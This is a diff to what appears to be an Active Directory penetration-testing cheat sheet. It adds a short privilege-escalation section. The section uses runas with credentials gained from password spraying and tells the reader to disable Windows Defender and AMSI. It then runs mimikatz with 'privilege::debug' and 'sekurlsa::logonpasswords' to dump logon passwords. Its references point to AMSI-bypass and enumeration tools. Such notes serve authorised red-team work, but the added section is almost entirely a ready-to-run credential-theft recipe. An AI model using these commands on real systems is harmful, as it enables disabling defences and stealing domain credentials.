@@ -683,6 +683,20 @@ Invoke-BloodHound -CollectionMethod All -Domain yourdomain.local
 * find all vuln from bloodhound via : [bloodhound-quickwin](https://github.com/kaluche/bloodhound-quickwin)
 
 
+# 7. privilege scalation
+
+## 7.1 using credencial from password spray
+```
+runas /user:DOMAIN\Username cmd
+
+## now disable windows defender and amsi , download mimikatz
+run as admin [mimikatz.exe](https://github.com/gentilkiwi/mimikatz)
+privilege::debug
+sekurlsa::logonpasswords
+```
+
+
+
 ### Refrences
 * [Amsi-Bypass-Powershell](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)
 * [winPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASexe)
